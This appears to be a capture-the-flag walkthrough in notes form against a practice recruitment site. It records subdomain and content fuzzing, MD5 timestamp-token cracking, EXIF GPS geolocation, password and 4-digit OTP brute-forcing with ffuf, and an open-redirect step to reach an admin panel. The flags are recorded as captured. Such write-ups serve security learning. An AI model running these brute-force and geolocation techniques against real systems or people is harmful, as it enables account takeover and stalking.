@@ -1,0 +1,140 @@
+domain ip: 68.183.255.206
+domain name: http://www.vulnrecruitment.co.uk/
+server: nginx/1.21.1 (Ubuntu)
+
+Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9
+
+dnsrecon -d vulnrecruitment.co.uk -D ~/wordlist/subdomains.txt -t brt
+
+//Subdomains found: admin.vulnrecruitment.co.uk
+curl admin.vulnrecruitment.co.uk -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+//["You are not allowed access from this IP address"]
+
+Contents discovery (admin.vulnrecruitment.co.uk):
+
+ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhOb GZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/content.txt -u "http://admin.vulnrecruitment.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
+//no relevant content found. I guess I have to figure out how to overpass 
+//denied access...
+
+
+Contents discovery (www.vulnrecruitment.co.uk):
+
+ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/content.txt -u "http://www.vulnrecruitment.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
+//content found: staff.
+
+Contents discovery (www.vulnrecruitment.co.uk/staff):
+
+ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/content.txt -u "http://www.vulnrecruitment.co.uk/staff/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
+//content found: portal, [id]/image.
+
+curl -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" "http://www.vulnrecruitment.co.uk/staff/2/image?id=1" -v  
+//404 - Resource (http://b38f1-uploads.vulnrecruitment.co.uk/uploads/2_1.jpg) not found    
+
+//entering http://b38f1-uploads.vulnrecruitment.co.uk/...
+#1 FLAG Found
+//[^FLAG^5C7FD96F39216FB4B5ADD5A87B531D69^FLAG^]
+
+-------------in search of the missing employee-----------------------------
+
+//Cracking id image tokens with CrackStation...
+id1 : 955dc852b26e9375c7b7858b438f80f6 md5 -> 03:28
+id2 : 0fbbd14791d5032e57cb38013a08c791 md5 -> 11:18
+id4 : 33379393610f7c99f05c85f9f92deaef md5 -> 19:33
+//tokens are md5 converted timestamps.
+
+//creating a file with all timestamps...
+//FUZZING...
+ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/id_tokens.txt -u "http://b38f1-uploads.vulnrecruitment.co.uk/uploads/3_FUZZ.jpg" -t 1 -p 0.1 -mc all -fc 404 -c
+//Token for 3rd employee: d9a39bb5097e8e57d4da9669ea44fd72
+
+//entering http://b38f1-uploads.vulnrecruitment.co.uk/uploads/3_d9a39bb5097e8e57d4da9669ea44fd72.jpg...
+
+curl "http://b38f1-uploads.vulnrecruitment.co.uk/uploads/3_d9a39bb5097e8e57d4da9669ea44fd72.jpg" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+//uhmm... it's just her photo in matrix sunglasses.
+//Extracting metadata with brandfolder.com...
+
+Extracted metadata:
+
+FileSize: 871 kB
+FileModifyDate: 2022-03-29T16:17:56.000+00:00
+FileAccessDate: 2022-03-29T16:17:56.000+00:00
+FileInodeChangeDate: 2022-03-29T16:17:56.000+00:00
+FileType: JPEG
+FileTypeExtension: jpg
+MIMEType: image/jpeg
+JFIFVersion: 1.01
+XResolution: 1
+YResolution: 1
+ExifByteOrder: Big-endian (Motorola, MM)
+ResolutionUnit: None
+YCbCrPositioning: Centered
+GPSLatitudeRef: North
+GPSLongitudeRef: East
+ImageWidth: 1024
+ImageHeight: 1024
+EncodingProcess: Progressive DCT, Huffman coding
+BitsPerSample: 8
+ColorComponents: 3
+YCbCrSubSampling: YCbCr4:4:4 (1 1)
+GPSLatitude: 51 deg 37' 47.31" N
+GPSLongitude: 0 deg 48' 50.82" E
+GPSPosition: 51 deg 37' 47.31" N, 0 deg 48' 50.82" E
+ImageSize: 1024x1024
+Megapixels: 1
+
+//Finding location...
+3 Hillside Road, Burnham on Crouch, CM0 8EY, United Kingdom
+
+---------Logging into www.vulnrecruitment.co.uk/staff/portal---------------
+
+//Creating a file of employees' emails
+employees.txt
+
+//FUZZING login page form with a cluster bomb
+
+ffuf -X POST -u http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/employees.txt:FUZZ1 -2 ~/wordlists/passwords.txt:FUZZ2 -d "email=FUZZ1&password=FUZZ2" -H "Content-Type: application/x-www-form-urlencoded" -fr ">Invalid email / password combination" -t 1 -p 0.1 -mc all -fc 404 -c -o result
+
+//Credentials found: 
+email: archie.bentley@vulnrecruitment.co.uk
+password: thunder
+
+curl -X POST -d "email=archie.bentley%40vulnrecruitment.co.uk&password=thunder" http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+
+//Need 4 digit authentication code...
+
+//creating file containing 4 digit numbers
+digits.txt
+
+ffuf -X POST -u http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/digits.txt -d "email=archie.bentley%40vulnrecruitment.co.uk&password=thunder&attempt=2&otp=9564" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid 4 digit security code" -t 1 -p 0.1 -mc all -fc 404 -c -o result
+
+//4 digit number found: 3798
+//Loging in with security number...
+
+#2 FLAG Found
+[^FLAG^7A35DD5278F7B5C98A8DB179992C63D8^FLAG^]
+//Lost employee found: amelia.nixon@vulnrecruitment.co.uk
+
+//Fuzzing login page with email: amelia.nixon@vulnrecruitment.co.uk
+ffuf -X POST -u http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/passwords.txt -d "email=amelia.nixon@vulnrecruitment.co.uk&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr ">Invalid email / password combination" -t 1 -p 0.1 -mc all -fc 404 -c -o result
+//password found: zxcvbn
+
+//Logging in with credentials...
+email: amelia.nixon@vulnrecruitment.co.uk
+password: zxcvbn
+
+//Security question appears.
+What is the name of your local pub?
+//making use of the coordinates given from the metadata. 
+Answer: The New Welcome Sailor
+
+#3 FLAG Found
+[^FLAG^F3D19DE5581B3DC332AA5D317E5A2CE7^FLAG^]
+//Seems like Amelia was an admin.
+
+----------------getting admin privilage------------------------------------
+
+//Changing parameter of listing_file to:
+ redirect?url=http://admin.vulnrecruitment.co.uk
+ 
+ #4 FLAG Found
+[^FLAG^AA739EA021524ACDBE103293E12E5E32^FLAG^]
